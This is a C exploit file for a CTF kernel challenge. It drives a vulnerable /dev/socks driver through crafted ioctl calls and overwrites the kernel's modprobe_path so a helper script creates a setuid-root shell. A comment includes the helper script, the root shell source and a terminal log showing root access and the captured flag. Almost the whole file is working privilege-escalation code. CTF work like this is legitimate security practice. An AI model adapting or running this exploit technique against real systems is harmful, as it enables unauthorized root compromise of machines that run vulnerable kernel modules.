#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <unistd.h>

#define cmd_0 0xC0087301 // cmp state == 0, kmalloc -> state = 1
#define cmd_1 0xC0407302 // copy_from_user 64 bytes, cmp state == 1, write name socket / find socket -> state = 2
#define cmd_2 0xC0407303 // copy_from_user 64 bytes, cmp state == 1, find socket -> state = 3
#define cmd_3 0xC0107304 // copy_from_user 16 bytes, cmp state == 3, read buffer from socket -> state dont touch
#define cmd_4 0xC0107305 // copy_from_user 16 bytes, cmp state == 3, copy to user buffer -> state dont touch

/*
pwn ->
#!/bin/sh
/bin/chown 0:0 /home/user/shell
/bin/chmod u+s /home/user/shell

shell ->
#include <stdio.h>
#include <unistd.h>

// diet gcc shell.c -o shell -static -D_GNU_SOURCE && uuencode shell shell
int main(int argc, char *argv[]) {
	if (getuid()) {
		printf("FAIL\n");
		return -1;			
	}

	printf("[+] Got root shell :)\n");
	char *cmd = "/bin/sh";
	char *args[] = {cmd, "-i", NULL};
	setresuid(0, 0, 0);
	setresgid(0, 0, 0);
 	execve(cmd, args, NULL);

	return 0;
}

~ $ chmod +x /home/user/pwn
~ $ ./exp
~ $ echo -ne "\xff\xff\xff\xff" > /home/user/trigger
~ $ chmod +x /home/user/trigger
~ $ ./trigger
~ $ ls -lah
total 44
drwxrwxrwx    2 user     user         140 Sep 12 15:48 .
drwxr-xr-x    3 root     root          60 Sep 12 15:27 ..
-rw-------    1 user     user         467 Sep 12 15:49 .ash_history
-rwxr-xr-x    1 user     user       15.8K Sep 12 15:41 exp
-rwxr-xr-x    1 user     user          75 Sep 12 15:37 pwn
-rwsr-xr-x    1 root     root       15.9K Sep 12 15:38 shell
-rwxr-xr-x    1 user     user           4 Sep 12 15:48 trigger
~ $ ./shell
[+] Got root shell :)
/home/user # id
uid=0(root) gid=0(root) groups=1000(user)
/home/user # cat /flag.txt
r2con{06e6ec5e2653a51e6e383ee4776a6670}
*/

int g_fd[4];
unsigned char sc[] = "/home/user/pwn\0";
unsigned long modprobe_path[] = {0x10, 0xffffffff82023ae0};
struct pwn {
	unsigned long size;
	unsigned long ptr;
};

int main(int argc, char *argv[]) {
	struct pwn p;

	p.size = 0x10;
	p.ptr = (unsigned long) modprobe_path;

	g_fd[0] = open("/dev/socks", O_RDONLY);
	g_fd[1] = open("/dev/socks", O_RDONLY);
	g_fd[2] = open("/dev/socks", O_RDONLY);
	g_fd[3] = open("/dev/socks", O_RDONLY);

	ioctl(g_fd[0], cmd_0, (unsigned long) -8);
	ioctl(g_fd[0], cmd_1, "AA");

	ioctl(g_fd[1], cmd_0, (unsigned long) -8);
	ioctl(g_fd[1], cmd_2, "AA");

	ioctl(g_fd[2], cmd_0, (unsigned long) -8);
	ioctl(g_fd[2], cmd_1, "A");

	ioctl(g_fd[3], cmd_0, (unsigned long) -8);
	ioctl(g_fd[3], cmd_2, "A");

	ioctl(g_fd[0], cmd_3, &p);

	p.size = 0x10;
	p.ptr = (unsigned long) sc;

	ioctl(g_fd[3], cmd_3, &p);

	return 0;
}

